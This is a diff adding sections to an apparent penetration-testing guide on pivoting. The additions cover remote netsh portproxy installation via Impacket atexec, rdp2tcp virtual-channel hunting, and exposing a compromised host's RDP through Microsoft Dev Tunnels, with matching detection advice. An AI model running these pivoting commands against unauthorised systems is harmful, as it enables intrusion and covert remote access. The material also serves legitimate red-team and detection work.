@@ -530,6 +530,17 @@ netsh interface portproxy show v4tov4
 netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 
+### Deploying `portproxy` through a scheduled task
+
+When administrative credentials are available, remote Task Scheduler execution can install a native forwarding rule without uploading a dedicated relay. For example, [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) can make a pivot listen on TCP/443 and relay the connection to an internal SMB service.<sup>[[57]](#references)[[58]](#references)</sup>
+
+```bash
+atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
+  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
+```
+
+The rule is persistent, so enumerate it with `netsh interface portproxy show v4tov4` and remove it explicitly after testing. Remember that `portproxy` provides forwarding only; the host firewall must also permit the listening port.<sup>[[24]](#references)</sup>
+
 ## SocksOverRDP & Proxifier
 
 You need to have **RDP access over the system**.\
@@ -562,6 +573,10 @@ netstat -antb | findstr 1080
 ```
 
 Now you can use [**Proxifier**](https://www.proxifier.com/) to proxy the traffic through that port.<sup>[[26]](#references)</sup>
+
+### RDP virtual-channel hunting
+
+[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) is another RDP virtual-channel tunnel; its default channel name is `rdp2tcp`, although an operator can select a different name.<sup>[[56]](#references)</sup> Channel creation and closure are recorded in `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` as event IDs **132** and **148**. Hunt for `rdp2tcp` and rare/random channel names, then compare them with expected channels such as `XPSRD`, `cliprdr`, and `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>
 
 ## Proxify Windows GUI Apps
 
@@ -805,6 +820,25 @@ tunnels:
     addr: file:///tmp/httpbin/
 ```
 
+## Microsoft Dev Tunnels
+
+Microsoft Dev Tunnels can publish a local TCP-backed service through Microsoft relay infrastructure. The host CLI creates an outbound tunnel, while `devtunnel connect` recreates the hosted port on the client; tunnels require authentication by default unless access controls are deliberately relaxed.<sup>[[55]](#references)[[58]](#references)</sup>
+
+```bash
+# Compromised/pivot host: publish its local RDP service
+# Save the tunnel ID printed by this command
+devtunnel host -p 3389
+
+# Operator host: authenticate as an authorized tunnel user and create
+# a local 127.0.0.1:3389 forward to the hosted port
+devtunnel connect <TUNNEL_ID>
+xfreerdp /u:<USER> /v:127.0.0.1:3389
+```
+
+This can expose RDP through `*.devtunnels.ms` without opening a new inbound listener on the perimeter. It can also be layered with an RDP virtual-channel tunnel such as `rdp2tcp`, turning the RDP session into a second-stage pivot for arbitrary TCP traffic.<sup>[[58]](#references)</sup>
+
+For hunting, correlate execution of the Dev Tunnels CLI with DNS/TLS traffic to `*.devtunnels.ms` and unexpected RDP virtual-channel events. An authenticated tunnel is not benign merely because it uses a Microsoft-owned relay.<sup>[[58]](#references)</sup>
+
 ## Cloudflared (Cloudflare Tunnel)
 
 Cloudflare Tunnel's `cloudflared` connector establishes outbound connections; published applications can route HTTP, HTTPS, TCP, SSH, and RDP, while quick tunnels are intended for HTTP development.<sup>[[43]](#references)[[45]](#references)</sup>
@@ -1030,5 +1064,9 @@ The same report details the defaults, wildcard listeners, packet decryption, rel
 - [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
 - [53] [NetSPI BOFScale source repository](https://github.com/NetSPI/BOFscale)
 - [54] [BOFScale: A CDN-Fronted Tailnet from a BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
+- [55] [Microsoft Learn - Dev Tunnels CLI commands](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
+- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
+- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
+- [58] [NightEagle APT: GhostContainer and Tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
 
 {{#include ../banners/hacktricks-training.md}}
